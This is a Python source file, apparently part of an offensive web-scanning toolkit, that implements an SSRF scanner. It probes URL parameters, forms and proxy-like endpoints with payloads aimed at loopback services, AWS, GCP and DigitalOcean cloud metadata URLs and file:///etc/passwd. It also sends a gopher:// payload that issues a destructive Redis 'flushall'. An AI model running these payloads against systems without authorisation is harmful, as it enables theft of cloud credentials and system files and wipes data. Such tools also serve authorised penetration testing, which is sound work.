# attacks/advanced/ssrf.py
from core.base_scanner import BaseScanner
from typing import Dict, List, Optional
import logging
import requests
from urllib.parse import urljoin, urlparse

class SSRFScanner(BaseScanner):
    def __init__(self, target_url: str, config: Dict):
        super().__init__(target_url, config)
        self.payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://127.0.0.1:22",
            "http://127.0.0.1:3306",
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://metadata.google.internal",           # GCP metadata
            "http://169.254.169.254/metadata/v1",       # DigitalOcean metadata
            "http://127.0.0.1:6379",                    # Redis
            "http://127.0.0.1:27017",                   # MongoDB
            "http://127.0.0.1:8080",                    # Common web port
            "file:///etc/passwd",
            "dict://127.0.0.1:11211/",                  # Memcached
            "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*1%0d%0a$4%0d%0ainfo%0d%0a", # Redis
            "ftp://127.0.0.1:21"
        ]
        
        # Common parameters that might be vulnerable to SSRF
        self.target_parameters = [
            'url',
            'uri',
            'link',
            'src',
            'dest',
            'redirect',
            'redirect_uri',
            'callback',
            'next',
            'site',
            'html',
            'file',
            'reference',
            'ref'
        ]

    def scan(self) -> Dict:
        try:
            tasks = []
            response = self.make_request(self.target_url)
            if not response:
                return {'ssrf': []}

            # Test URL parameters
            params = self.extract_url_parameters(self.target_url)
            for param in params:
                if param.lower() in self.target_parameters:
                    tasks.append({
                        'type': 'url',
                        'url': self.target_url,
                        'method': 'GET',
                        'parameter': param
                    })

            # Test form inputs
            forms = self.extract_forms(response.text)
            for form in forms:
                form_url = urljoin(self.target_url, form.get('action', ''))
                for input_field in form.get('inputs', []):
                    if input_field.get('name', '').lower() in self.target_parameters:
                        tasks.append({
                            'type': 'form',
                            'url': form_url,
                            'method': form.get('method', 'GET'),
                            'parameter': input_field['name']
                        })

            # Test common endpoints that might be vulnerable
            endpoints = ['/fetch', '/proxy', '/connect', '/redirect', '/load']
            for endpoint in endpoints:
                endpoint_url = urljoin(self.target_url, endpoint)
                tasks.append({
                    'type': 'endpoint',
                    'url': endpoint_url,
                    'method': 'GET',
                    'parameter': 'url'
                })

            results = self.run_concurrent_tasks(tasks)
            return {'ssrf': results}

        except Exception as e:
            logging.error(f"SSRF scanner error: {e}")
            return {'ssrf': [], 'error': str(e)}

    def execute_task(self, task: Dict) -> Optional[Dict]:
        try:
            for payload in self.payloads:
                result = self.test_ssrf(
                    task['url'],
                    task['method'],
                    task['parameter'],
                    payload
                )
                if result:
                    return {
                        'url': task['url'],
                        'method': task['method'],
                        'parameter': task['parameter'],
                        'payload': payload,
                        'type': 'Server-Side Request Forgery',
                        'severity': 'High',
                        'evidence': result
                    }
            return None

        except Exception as e:
            logging.error(f"Error in SSRF task: {e}")
            return None

    def test_ssrf(self, url: str, method: str, param: str, payload: str) -> Optional[str]:
        try:
            # Make normal request first
            normal_data = {param: "https://www.example.com"}
            normal_response = self.make_request(
                url,
                method=method.upper(),
                data=normal_data if method.lower() == 'post' else None,
                params=normal_data if method.lower() == 'get' else None
            )

            # Make request with SSRF payload
            data = {param: payload}
            response = self.make_request(
                url,
                method=method.upper(),
                data=data if method.lower() == 'post' else None,
                params=data if method.lower() == 'get' else None,
                allow_redirects=False
            )

            if not response or not normal_response:
                return None

            # Check for SSRF indicators
            indicators = {
                'ssh-': 'SSH service detected',
                'mysql': 'MySQL service detected',
                'mongodb': 'MongoDB instance detected',
                'redis': 'Redis instance detected',
                'internal server error': 'Server error indicating potential SSRF',
                'root:': 'System file access detected',
                'metadata': 'Cloud metadata access detected'
            }

            for keyword, message in indicators.items():
                if (keyword in response.text.lower() and 
                    keyword not in normal_response.text.lower()):
                    return message

            # Check for status code differences
            if response.status_code != normal_response.status_code:
                return f"Status code change: {normal_response.status_code} -> {response.status_code}"

            # Check for significant response differences
            if abs(len(response.text) - len(normal_response.text)) > 100:
                return "Significant response length difference detected"

            return None

        except Exception as e:
            logging.error(f"Error testing SSRF: {e}")
            return None

    def extract_forms(self, html: str) -> List[Dict]:
        """Extract forms from HTML content"""
        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(html, 'html.parser')
            forms = []
            
            for form in soup.find_all('form'):
                inputs = []
                for input_field in form.find_all(['input', 'textarea']):
                    inputs.append({
                        'name': input_field.get('name', ''),
                        'type': input_field.get('type', 'text')
                    })
                
                forms.append({
                    'action': form.get('action', ''),
                    'method': form.get('method', 'get').upper(),
                    'inputs': inputs
                })
                
            return forms
        except Exception as e:
            logging.error(f"Error extracting forms: {e}")
            return []

    def extract_url_parameters(self, url: str) -> List[str]:
        """Extract parameters from URL"""
        try:
            parsed = urlparse(url)
            params = []
            
            if parsed.query:
                from urllib.parse import parse_qs
                params.extend(parse_qs(parsed.query).keys())
                
            return params
        except Exception as e:
            logging.error(f"Error extracting URL parameters: {e}")
            return []
